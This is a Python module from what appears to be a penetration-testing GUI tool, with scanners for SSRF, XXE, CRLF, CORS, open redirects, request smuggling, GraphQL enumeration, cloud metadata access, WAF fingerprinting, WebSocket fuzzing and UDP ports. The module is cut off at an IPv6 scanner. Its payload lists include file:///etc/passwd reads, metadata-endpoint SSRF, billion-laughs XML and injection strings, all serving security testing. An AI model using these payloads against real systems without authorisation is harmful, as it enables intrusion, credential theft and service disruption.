from gui.engine._core import *

# ---------------------------------------------------------------------------
# Wayback Machine — list snapshots of a domain
# ---------------------------------------------------------------------------
def wayback_urls(domain: str, limit: int, log: Logger) -> list[str]:
    """Query the Internet Archive CDX API for historical URLs of a domain."""
    import requests
    log(f"[*] Querying Wayback CDX for {domain}", "cyan")
    api = (f"http://web.archive.org/cdx/search/cdx?url={domain}/*"
           f"&output=json&fl=original&collapse=urlkey&limit={limit}")
    try:
        resp = requests.get(api, timeout=30,
                            headers={"User-Agent": random_ua()})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return []
    if resp.status_code != 200:
        log(f"[-] Wayback returned HTTP {resp.status_code}", "err")
        return []
    try:
        data = resp.json()
    except ValueError:
        log("[-] Non-JSON response", "err"); return []
    # First row is the column header
    urls = [row[0] for row in data[1:]] if data else []
    interesting = [u for u in urls
                   if any(s in u.lower()
                          for s in (".env", ".bak", ".git", "config", "admin",
                                    "backup", "secret", "key", "/api/", ".sql",
                                    ".log", "dump"))]
    for u in urls[:30]:
        log(f"  {u}", "info")
    if len(urls) > 30:
        log(f"  ... +{len(urls) - 30} more", "muted")
    if interesting:
        log(f"[+] {len(interesting)} potentially interesting URL(s):", "ok")
        for u in interesting[:25]:
            log(f"    ★ {u}", "accent")
    log(f"[*] Total: {len(urls)} unique URLs", "cyan")
    return urls


# ---------------------------------------------------------------------------
# GraphQL field enumeration (when introspection is disabled)
# ---------------------------------------------------------------------------
GRAPHQL_FIELD_GUESSES = [
    "user", "users", "me", "viewer", "currentUser", "profile", "profiles",
    "account", "accounts", "node", "nodes", "search", "find", "get", "list",
    "all", "admin", "adminUsers", "session", "sessions", "token", "auth",
    "login", "register", "products", "items", "orders", "transactions",
    "posts", "articles", "comments", "messages", "files", "uploads",
    "settings", "config", "configuration", "internal", "debug", "test",
    "secrets", "keys", "credentials", "permissions", "roles", "groups",
]


def graphql_field_enum(url: str, log: Logger) -> dict:
    """When introspection is OFF, brute-force common field names against
    the queryType and report which ones the server *recognizes*."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] GraphQL field enum on {url} "
        f"({len(GRAPHQL_FIELD_GUESSES)} guesses)", "cyan")

    found: list[str] = []
    sess = requests.Session()
    sess.headers.update({"Content-Type": "application/json",
                         "User-Agent": random_ua()})

    for field in GRAPHQL_FIELD_GUESSES:
        if _should_stop():
            break
        # Empty selection set -> server complains about a *specific* field if
        # the field doesn't exist, but with a parser/validator error for the
        # missing subselection if it *does* exist on a non-leaf type.
        query = {"query": "{ " + field + " }"}
        try:
            resp = sess.post(url, json=query, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        try:
            data = resp.json()
        except ValueError:
            continue
        errors = data.get("errors") or []
        text = " ".join(str(e.get("message", "")).lower() for e in errors)
        # Heuristic: "must have a selection of subfields" / "Field ... is
        # missing" -> the field exists. "Cannot query field" -> it doesn't.
        if not errors and data.get("data") is not None:
            found.append(field)
            log(f"[+] {field}: returned data", "ok")
        elif "selection of subfields" in text or "must have a selection" in text:
            found.append(field)
            log(f"[+] {field}: exists (object type)", "ok")
        elif "field" in text and "not found" not in text and "unknown" not in text \
                and "cannot query" not in text:
            log(f"  {field}: ambiguous — {text[:80]}", "muted")

    log(f"[*] {len(found)} probable field(s)", "cyan")
    sess.close()
    return {"found": found}


# ---------------------------------------------------------------------------
# HTTP request smuggling detector
# ---------------------------------------------------------------------------
def http_smuggling_detect(url: str, log: Logger) -> dict:
    """Probe for CL.TE / TE.CL desync via a malformed Transfer-Encoding."""
    import socket as _socket
    import ssl
    from urllib.parse import urlparse

    parsed = urlparse(url if url.startswith(("http://", "https://"))
                      else "http://" + url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"

    if not host:
        log("[-] Invalid URL", "err"); return {}

    log(f"[*] HTTP smuggling probe {host}:{port}{path}", "cyan")

    findings: dict = {"host": host, "port": port, "results": []}

    # CL.TE probe — frontend uses Content-Length, backend uses Transfer-Encoding
    cl_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    # TE.CL probe — frontend uses Transfer-Encoding, backend uses Content-Length
    te_cl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5e\r\n"
        "x" * 94 + "\r\n"
        "0\r\n"
        "\r\n"
    )
    # TE.TE — obfuscated TE headers
    te_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "\r\n"
        "5c\r\n"
        "x" * 92 + "\r\n"
        "0\r\n"
        "\r\n"
    )

    for name, payload in (("CL.TE", cl_te), ("TE.CL", te_cl),
                          ("TE.TE (dup TE header)", te_te)):
        if _should_stop():
            break
        try:
            raw_sock = _socket.create_connection((host, port), timeout=REQUEST_TIMEOUT)
            sock = raw_sock
            try:
                if parsed.scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(raw_sock, server_hostname=host)
                sock.sendall(payload.encode())
                sock.settimeout(8)
                data = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if len(data) > 16384:
                            break
                except (TimeoutError, _socket.timeout):
                    pass
            finally:
                sock.close()
                if sock is not raw_sock:
                    try:
                        raw_sock.close()
                    except OSError:
                        pass  # SSLSocket.close() already closed underlying fd
        except OSError as exc:
            log(f"  {name}: connection error {exc}", "muted")
            findings["results"].append({"variant": name, "error": str(exc)})
            continue

        text = data.decode("utf-8", errors="replace")
        first_line = text.split("\r\n", 1)[0] if text else "(no response)"
        # Heuristics: 400/408/501 with "ambiguous" / "invalid Transfer-Encoding"
        # or a hung response indicates the server treated the request oddly.
        suspicious = (
            "400" in first_line
            and any(s in text.lower()
                    for s in ("transfer-encoding", "ambiguous",
                              "invalid", "smuggling"))
        )
        tag = "warn" if suspicious else "info"
        log(f"  {name}: {first_line}", tag)
        findings["results"].append({"variant": name, "first_line": first_line,
                                    "suspicious": suspicious})

    if not any(r.get("suspicious") for r in findings["results"]):
        log("[+] No obvious smuggling indicator detected (single-pass probe).",
            "ok")
    else:
        log("[!] Suspicious response patterns — manual review required.",
            "warn")
    return findings


# ---------------------------------------------------------------------------
# CORS misconfiguration tester
# ---------------------------------------------------------------------------
def cors_test(url: str, log: Logger) -> dict:
    """Probe a URL with various Origin headers; report risky reflections."""
    import requests
    from urllib.parse import urlparse
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    origins = [
        "https://evil.com",
        f"https://{parsed.hostname}.evil.com",
        "null",
        f"http://attacker.{parsed.hostname}",
        "https://" + (parsed.hostname or "") + ".attacker.io",
    ]
    findings: list[dict] = []
    log(f"[*] CORS test {url}", "cyan")
    for origin in origins:
        if _should_stop():
            break
        try:
            resp = _retry(requests.get, url, timeout=REQUEST_TIMEOUT,
                          headers={"Origin": origin,
                                   "User-Agent": random_ua()})
        except requests.RequestException as exc:
            log(f"  [-] {origin}: {exc}", "muted")
            continue
        acao = resp.headers.get("Access-Control-Allow-Origin")
        acac = resp.headers.get("Access-Control-Allow-Credentials")
        risky = False
        notes = []
        if acao == origin:
            risky = True
            notes.append("reflected origin")
        if acao == "*":
            notes.append("wildcard")
        if acac and acac.lower() == "true" and acao and acao != "*":
            notes.append("creds=true with non-wildcard ACAO")
            risky = True
        tag = "err" if risky else "info"
        log(f"  Origin={origin}  ACAO={acao}  ACAC={acac}  {' / '.join(notes)}",
            tag)
        findings.append({"origin": origin, "acao": acao, "acac": acac,
                         "risky": risky, "notes": notes})
    risky_n = sum(1 for f in findings if f.get("risky"))
    log(f"[*] {risky_n} risky configuration(s) detected", "warn" if risky_n else "ok")
    result = {"findings": findings}
    session_set("last_cors_result", result)
    return result


# ---------------------------------------------------------------------------
# Open redirect tester
# ---------------------------------------------------------------------------
def open_redirect_test(url: str, log: Logger) -> list[tuple[str, str]]:
    """Try redirect-style payloads in each query parameter."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []
    payloads = [
        "https://evil.example.com",
        "//evil.example.com",
        "/\\evil.example.com",
        "https:%2f%2fevil.example.com",
        "https://example.com@evil.example.com",
    ]
    findings: list[tuple[str, str]] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})
    for param in params:
        if _should_stop():
            break
        log(f"[*] Testing parameter: {param}", "cyan")
        for p in payloads:
            mut = dict(params); mut[param] = p
            test_url = urlunparse(parsed._replace(query=urlencode(mut)))
            try:
                resp = sess.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            except requests.RequestException:
                continue
            loc = resp.headers.get("Location", "")
            if loc and ("evil.example.com" in loc):
                findings.append((param, p))
                log(f"[+] Redirect to attacker domain via {param}={p}  Location={loc}",
                    "err")
    if not findings:
        log("[+] No open-redirect indicator found", "ok")
    sess.close()
    session_set("last_open_redirect", findings)
    return findings


# ---------------------------------------------------------------------------
# WAF detection
# ---------------------------------------------------------------------------
WAF_SIGNATURES: list[tuple[str, list[tuple[str, str]]]] = [
    # name, list of (where, regex) — where ∈ "header" / "cookie" / "body" / "server"
    ("Cloudflare",        [("header", "cf-ray"), ("server", "cloudflare")]),
    ("AWS WAF",           [("header", "x-amzn-requestid"), ("header", "x-amz-cf-id")]),
    ("Akamai",            [("header", "akamai-"), ("server", "akamai")]),
    ("Imperva Incapsula", [("cookie", "incap_ses"), ("cookie", "visid_incap")]),
    ("Sucuri",            [("server", "sucuri/"), ("header", "x-sucuri-id")]),
    ("F5 BIG-IP",         [("cookie", "bigipserver"), ("cookie", "ts[a-z0-9]+=")]),
    ("Barracuda",         [("cookie", "barra_counter_session"), ("server", "barracuda")]),
    ("ModSecurity",       [("server", "mod_security"), ("body", "mod_security")]),
    ("Wallarm",           [("header", "x-wallarm")]),
    ("StackPath",         [("server", "stackpath")]),
    ("Fastly",            [("header", "fastly-debug-digest"), ("server", "fastly")]),
    ("Azure Front Door",  [("header", "x-azure-ref")]),
    ("Google Cloud Armor",[("server", "google frontend")]),
]


def waf_detect(url: str, log: Logger) -> list[str]:
    """Send a baseline + a noisy probe and try to fingerprint the WAF."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        baseline = requests.get(url, timeout=REQUEST_TIMEOUT,
                                headers={"User-Agent": random_ua()},
                                allow_redirects=True)
        noisy = requests.get(
            url + "?id=1' OR 1=1--&xss=<script>alert(1)</script>",
            timeout=REQUEST_TIMEOUT,
            headers={"User-Agent": random_ua()},
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return []

    detected: set[str] = set()
    for resp in (baseline, noisy):
        headers_str = "\n".join(f"{k.lower()}: {v}" for k, v in resp.headers.items())
        cookies_str = "\n".join(c.name + "=" for c in resp.cookies)
        server = resp.headers.get("Server", "").lower()
        body = (resp.text or "")[:50000].lower()
        for name, sigs in WAF_SIGNATURES:
            for where, pattern in sigs:
                target = {
                    "header": headers_str,
                    "cookie": cookies_str,
                    "server": server,
                    "body": body,
                }.get(where, "")
                if re.search(pattern, target, re.I):
                    detected.add(name)
                    break

    if noisy.status_code in (403, 406, 429, 501) and baseline.status_code == 200:
        detected.add(f"Generic WAF (blocked noisy request: HTTP {noisy.status_code})")

    if detected:
        for name in sorted(detected):
            log(f"[+] WAF detected: {name}", "ok")
    else:
        log("[!] No WAF signature matched", "warn")
    return sorted(detected)


# ---------------------------------------------------------------------------
# GraphQL introspection tester
# ---------------------------------------------------------------------------
def graphql_introspect(url: str, log: Logger) -> dict:
    """POST an introspection query; report whether it's enabled."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    query = {
        "query": "query IntrospectionQuery {__schema {types {name kind} "
                 "queryType {name} mutationType {name} subscriptionType {name}}}"
    }
    log(f"[*] GraphQL introspection POST {url}", "cyan")
    try:
        resp = requests.post(url, json=query, timeout=REQUEST_TIMEOUT,
                             headers={"User-Agent": random_ua(),
                                      "Content-Type": "application/json"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return {}
    if resp.status_code >= 400:
        log(f"[!] HTTP {resp.status_code}  introspection probably disabled",
            "warn")
        return {"enabled": False, "status": resp.status_code}
    try:
        data = resp.json()
    except ValueError:
        log("[-] Non-JSON response", "err")
        return {"enabled": False, "status": resp.status_code}
    schema = (data.get("data") or {}).get("__schema")
    if not schema:
        log("[!] No __schema in response — introspection blocked", "warn")
        return {"enabled": False, "status": resp.status_code}
    types = schema.get("types") or []
    log(f"[+] Introspection ENABLED — {len(types)} types exposed", "err")
    log(f"  queryType:        {(schema.get('queryType') or {}).get('name')}",
        "info")
    log(f"  mutationType:     {(schema.get('mutationType') or {}).get('name')}",
        "info")
    log(f"  subscriptionType: {(schema.get('subscriptionType') or {}).get('name')}",
        "info")
    sample = ", ".join(sorted({t["name"] for t in types
                               if not t["name"].startswith("__")})[:15])
    log(f"  types (sample):   {sample}{'...' if len(types) > 15 else ''}",
        "info")
    return {"enabled": True, "types": len(types), "schema": schema}


# ---------------------------------------------------------------------------
# Cloud metadata IMDS reachability check
# ---------------------------------------------------------------------------
IMDS_ENDPOINTS: list[tuple[str, str, str]] = [
    ("AWS IMDSv1",     "http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("AWS IMDSv2 (ping)", "http://169.254.169.254/latest/api/token", "PUT"),
    ("Azure",          "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
    ("GCP",            "http://metadata.google.internal/computeMetadata/v1/", ""),
    ("Alibaba",        "http://100.100.100.200/latest/meta-data/", ""),
    ("DigitalOcean",   "http://169.254.169.254/metadata/v1/", ""),
    ("Oracle Cloud",   "http://169.254.169.254/opc/v1/instance/", ""),
    ("Hetzner",        "http://169.254.169.254/hetzner/v1/metadata", ""),
]


def imds_check(via_url: str, log: Logger) -> list[dict]:
    """If the target is vulnerable to SSRF, see if cloud IMDS endpoints are
    reachable through it. ``via_url`` should be a URL with an SSRF parameter
    placeholder ``{TARGET}`` — e.g. ``https://victim/proxy?u={TARGET}``.
    If no placeholder is given, probe directly (only useful from inside a VM).
    """
    import requests
    direct = "{TARGET}" not in via_url
    log(f"[*] IMDS probe ({'direct' if direct else 'via SSRF'})", "cyan")
    findings: list[dict] = []
    for name, target, marker in IMDS_ENDPOINTS:
        if _should_stop():
            break
        url = target if direct else via_url.replace("{TARGET}", target)
        try:
            if "GCP" in name or "Hetzner" in name:
                resp = requests.get(url, timeout=5,
                                    headers={"Metadata-Flavor": "Google",
                                             "User-Agent": random_ua()})
            elif "Azure" in name:
                resp = requests.get(url, timeout=5,
                                    headers={"Metadata": "true",
                                             "User-Agent": random_ua()})
            elif "IMDSv2" in name:
                resp = requests.put(url, timeout=5,
                                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "60",
                                             "User-Agent": random_ua()})
            else:
                resp = requests.get(url, timeout=5,
                                    headers={"User-Agent": random_ua()})
        except requests.RequestException as exc:
            log(f"  [-] {name}: {exc}", "muted"); continue
        ok = (resp.status_code == 200
              and (not marker or marker in resp.text or marker == "PUT"))
        tag = "err" if ok else "muted"
        log(f"  [{resp.status_code}] {name}  {url[:70]}", tag)
        findings.append({"service": name, "url": url,
                         "status": resp.status_code, "reachable": ok,
                         "preview": resp.text[:200] if ok else ""})
    return findings


# ---------------------------------------------------------------------------
# HTTP repeater (defined later — leave the original)
# ---------------------------------------------------------------------------
def http_repeat(method: str, url: str, headers_text: str, body: str,
                log: Logger) -> dict:
    """Send one HTTP request; print the response status + headers + body preview."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    headers: dict[str, str] = {"User-Agent": random_ua()}
    for line in (headers_text or "").splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        headers[k.strip()] = v.strip()

    method = (method or "GET").upper()
    log(f"[*] {method} {url}", "cyan")
    try:
        resp = requests.request(
            method, url, headers=headers,
            data=body.encode("utf-8") if body else None,
            timeout=15, allow_redirects=False,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return {}

    log(f"[+] HTTP {resp.status_code}  {resp.reason}", "ok")
    log("  ─── Response headers ───", "muted")
    for k, v in resp.headers.items():
        log(f"  {k}: {v}", "info")
    log(f"  ─── Body ({len(resp.content)} bytes) ───", "muted")
    text = resp.text
    preview = "\n".join(text.splitlines()[:80])
    for line in preview.splitlines():
        log(f"  {line}", "info")
    if len(text.splitlines()) > 80:
        log(f"  ... +{len(text.splitlines()) - 80} more lines", "muted")
    return {
        "status": resp.status_code, "reason": resp.reason,
        "headers": dict(resp.headers), "body": text,
    }


# ===========================================================================
# PHASE 9 — 30 Advanced Penetration Testing Tools
# ===========================================================================


# ---------------------------------------------------------------------------
# 1. SSRF Scanner
# ---------------------------------------------------------------------------
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/stat",
    "http://0.0.0.0",
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",
]


def ssrf_scan(url: str, param: str, log: Logger) -> list[dict]:
    """Test a URL parameter for SSRF by injecting internal-network payloads."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))

    if param and param not in params:
        params[param] = ""

    target_param = param or next(iter(params), None)
    if not target_param:
        log("[-] No parameter to test. Supply ?param=value in URL or specify param name.", "err")
        return []

    log(f"[*] SSRF scan on {url} — parameter: {target_param}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    # Get baseline
    try:
        baseline = sess.get(url, timeout=REQUEST_TIMEOUT)
        baseline_len = len(baseline.content)
        baseline_time = baseline.elapsed.total_seconds()
    except requests.RequestException as exc:
        log(f"[-] Baseline request failed: {exc}", "err")
        return []

    for payload in SSRF_PAYLOADS:
        if _should_stop():
            break
        mut = dict(params)
        mut[target_param] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(mut)))
        try:
            start = time.time()
            resp = sess.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            elapsed = time.time() - start
        except requests.RequestException:
            continue

        # Heuristics: different response size, interesting content, or time delta
        indicators = []
        if abs(len(resp.content) - baseline_len) > 200:
            indicators.append("size_diff")
        if elapsed > baseline_time + 3:
            indicators.append("time_delay")
        # Content markers
        body = resp.text[:5000].lower()
        for marker in ("root:", "ami-id", "meta-data", "[extensions]",
                       "win.ini", "compute", "localhost"):
            if marker in body:
                indicators.append(f"content:{marker}")

        if indicators:
            log(f"[+] {payload} → HTTP {resp.status_code} | {', '.join(indicators)}", "err")
            findings.append({"payload": payload, "status": resp.status_code,
                             "indicators": indicators})
        else:
            log(f"  {payload} → HTTP {resp.status_code} (benign)", "muted")

    log(f"[*] {len(findings)} potential SSRF indicator(s)", "warn" if findings else "ok")
    sess.close()
    session_set("last_ssrf_result", findings)
    return findings


# ---------------------------------------------------------------------------
# 2. XXE Injection Tester
# ---------------------------------------------------------------------------
XXE_PAYLOADS = [
    # Classic file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root>&xxe;</root>'),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root>&xxe;</root>'),
    # Parameter entity OOB
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
     '"http://localhost:0/xxe-test">%xxe;]><root/>'),
    # Billion laughs (DoS detection)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
     '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
     '<root>&lol2;</root>'),
]


def xxe_test(url: str, log: Logger) -> list[dict]:
    """Send XXE payloads to an endpoint that accepts XML."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] XXE injection test on {url}", "cyan")
    findings: list[dict] = []

    for i, payload in enumerate(XXE_PAYLOADS, 1):
        if _should_stop():
            break
        try:
            resp = requests.post(url, data=payload, timeout=REQUEST_TIMEOUT,
                                 headers={"Content-Type": "application/xml",
                                           "User-Agent": random_ua()})
        except requests.RequestException as exc:
            log(f"  Payload {i}: connection error — {exc}", "muted")
            continue

        body = resp.text[:5000].lower()
        indicators = []
        for marker in ("root:", "[extensions]", "win.ini", "passwd",
                       "lol", "xml parsing error", "entity"):
            if marker in body:
                indicators.append(marker)
        if resp.status_code == 200 and indicators:
            log(f"[+] Payload {i}: HTTP {resp.status_code} — {', '.join(indicators)}", "err")
            findings.append({"payload_idx": i, "status": resp.status_code,
                             "indicators": indicators, "preview": resp.text[:300]})
        else:
            log(f"  Payload {i}: HTTP {resp.status_code} — no indicators", "muted")

    log(f"[*] {len(findings)} XXE indicator(s) found", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 3. CRLF Injection Tester
# ---------------------------------------------------------------------------
CRLF_PAYLOADS = [
    "%0d%0aInjected-Header: PENETRATOR",
    "%0aInjected-Header: PENETRATOR",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\\r\\nInjected-Header: PENETRATOR",
    "%E5%98%8A%E5%98%8DInjected-Header: PENETRATOR",  # Unicode CRLF
]


def crlf_test(url: str, log: Logger) -> list[dict]:
    """Test URL parameters for CRLF injection (header injection)."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []

    log(f"[*] CRLF injection test on {url}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua()})

    for param_name in params:
        if _should_stop():
            break
        for payload in CRLF_PAYLOADS:
            if _should_stop():
                break
            mut = dict(params)
            mut[param_name] = params[param_name] + payload
            test_url = urlunparse(parsed._replace(query=urlencode(mut, safe="")))
            try:
                resp = sess.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            except requests.RequestException:
                continue
            # Check if our injected header appeared
            if "injected-header" in "\n".join(
                f"{k}: {v}" for k, v in resp.headers.items()
            ).lower():
                log(f"[+] CRLF via {param_name} — header injected!", "err")
                findings.append({"param": param_name, "payload": payload,
                                 "type": "header_injection"})
            elif "<script>" in resp.text and "alert(1)" in resp.text:
                log(f"[+] CRLF→XSS via {param_name}!", "err")
                findings.append({"param": param_name, "payload": payload,
                                 "type": "crlf_to_xss"})

    if not findings:
        log("[+] No CRLF injection detected", "ok")
    sess.close()
    return findings


# ---------------------------------------------------------------------------
# 4. Race Condition Tester
# ---------------------------------------------------------------------------
def race_condition_test(url: str, method: str, body: str, count: int,
                        log: Logger) -> dict:
    """Send N concurrent identical requests to detect TOCTOU race conditions."""
    import requests
    from concurrent.futures import ThreadPoolExecutor, as_completed

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    method = (method or "POST").upper()
    count = max(2, min(200, count))
    log(f"[*] Race condition test: {count}× {method} {url}", "cyan")

    sess = requests.Session()
    sess.headers.update({"User-Agent": random_ua(),
                         "Content-Type": "application/x-www-form-urlencoded"})

    results: list[dict] = []

    def fire(_):
        """Send one concurrent request and return the result dict."""
        try:
            resp = sess.request(method, url,
                                data=body.encode() if body else None,
                                timeout=15, allow_redirects=False)
            return {"status": resp.status_code, "length": len(resp.content),
                    "snippet": resp.text[:200]}
        except requests.RequestException as exc:
            return {"status": 0, "error": str(exc)}

    with ThreadPoolExecutor(max_workers=count) as pool:
        futures = [pool.submit(fire, i) for i in range(count)]
        for fut in as_completed(futures):
            if _should_stop():
                for p in futures:
                    p.cancel()
                break
            results.append(fut.result())

    # Analyze variance
    statuses = [r["status"] for r in results]
    lengths = [r.get("length", 0) for r in results]
    unique_statuses = set(statuses)
    unique_lengths = len(set(lengths))

    log(f"[*] Responses: {len(results)} received", "info")
    log(f"  Status codes: {dict((s, statuses.count(s)) for s in unique_statuses)}", "info")
    log(f"  Unique body lengths: {unique_lengths}", "info")

    suspicious = unique_lengths > 2 or len(unique_statuses) > 1
    if suspicious:
        log("[!] Response variance detected — possible race condition", "warn")
    else:
        log("[+] Responses are consistent — no obvious race", "ok")

    sess.close()
    return {"total": len(results), "unique_statuses": list(unique_statuses),
            "unique_lengths": unique_lengths, "suspicious": suspicious,
            "results": results[:10]}


# ---------------------------------------------------------------------------
# 5. WebSocket Fuzzer
# ---------------------------------------------------------------------------
WS_FUZZ_PAYLOADS = [
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "{{7*7}}",
    "${7*7}",
    "../../../etc/passwd",
    "A" * 10000,
    '{"__proto__":{"admin":true}}',
    "null",
    "-1",
    '{"query":"mutation{deleteAll}"}',
]


def websocket_fuzz(url: str, log: Logger) -> list[dict]:
    """Connect to a WebSocket endpoint and send fuzz payloads."""
    try:
        import websocket
    except ImportError:
        log("[-] websocket-client not installed. Run: pip install websocket-client", "err")
        return []

    if not url.startswith(("ws://", "wss://")):
        # Strip http(s):// prefix properly, then prepend ws://
        for prefix in ("https://", "http://"):
            if url.startswith(prefix):
                url = url[len(prefix):]
                break
        url = "ws://" + url
    log(f"[*] WebSocket fuzz on {url} ({len(WS_FUZZ_PAYLOADS)} payloads)", "cyan")
    findings: list[dict] = []

    try:
        ws = websocket.create_connection(url, timeout=REQUEST_TIMEOUT)
    except Exception as exc:
        log(f"[-] Connection failed: {exc}", "err")
        return []

    for payload in WS_FUZZ_PAYLOADS:
        if _should_stop():
            break
        try:
            ws.send(payload)
            ws.settimeout(3)
            resp = ws.recv()
        except Exception as exc:
            log(f"  [-] {exc}", "muted")
            resp = ""
        indicators = []
        resp_lower = resp.lower() if resp else ""
        if "error" in resp_lower or "exception" in resp_lower:
            indicators.append("error_leak")
        if "sql" in resp_lower or "syntax" in resp_lower:
            indicators.append("sqli_hint")
        if payload in resp:
            indicators.append("reflected")
        if len(resp) > 5000:
            indicators.append("large_response")

        if indicators:
            log(f"[+] Payload '{payload[:40]}' → {', '.join(indicators)}", "warn")
            findings.append({"payload": payload, "response": resp[:300],
                             "indicators": indicators})
        else:
            log(f"  '{payload[:40]}' → {len(resp)} bytes", "muted")

    try:
        ws.close()
    except Exception as exc:
        log(f"  [-] {exc}", "muted")
    log(f"[*] {len(findings)} interesting response(s)", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 6. UDP Port Scanner
# ---------------------------------------------------------------------------
UDP_TOP_PORTS = [
    53, 67, 68, 69, 111, 123, 135, 137, 138, 139, 161, 162, 445,
    500, 514, 520, 631, 1434, 1900, 4500, 5353, 5060, 11211,
]

UDP_SERVICE_MAP = {
    53: "dns", 67: "dhcp-server", 68: "dhcp-client", 69: "tftp",
    111: "rpcbind", 123: "ntp", 135: "msrpc", 137: "netbios-ns",
    138: "netbios-dgm", 139: "netbios-ssn", 161: "snmp", 162: "snmptrap",
    445: "microsoft-ds", 500: "isakmp", 514: "syslog", 520: "rip",
    631: "ipp", 1434: "ms-sql-m", 1900: "ssdp", 4500: "nat-t",
    5353: "mdns", 5060: "sip", 11211: "memcached",
}


def udp_scan(host: str, ports: list[int] | None, log: Logger) -> list[dict]:
    """UDP port scanner — sends empty datagrams and protocol-specific probes."""
    import socket as _socket
    if not ports:
        ports = UDP_TOP_PORTS
    log(f"[*] UDP scan {host} — {len(ports)} ports", "cyan")
    open_ports: list[dict] = []

    probes: dict[int, bytes] = {
        53: b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS
        123: b"\x1b" + b"\x00" * 47,  # NTP
        161: (b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04"
              b"\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b"
              b"\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"),  # SNMP
        1900: b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMX:1\r\nMan:\"ssdp:discover\"\r\n\r\n",
    }

    for port in ports:
        if _should_stop():
            break
        probe = probes.get(port, b"\x00")
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(probe, (host, port))
            data, _ = sock.recvfrom(1024)
            svc = UDP_SERVICE_MAP.get(port, "unknown")
            log(f"[+] {port}/udp OPEN ({svc}) — {len(data)} bytes response", "ok")
            open_ports.append({"port": port, "service": svc, "banner": data[:80].hex()})
        except _socket.timeout:
            pass  # filtered or closed
        except OSError:
            pass
        finally:
            try:
                sock.close()
            except Exception as exc:
                log(f"  [-] {exc}", "muted")

    log(f"[*] {len(open_ports)} open UDP port(s) found", "cyan")
    return open_ports


# ---------------------------------------------------------------------------
# 7. IPv6 Scanner
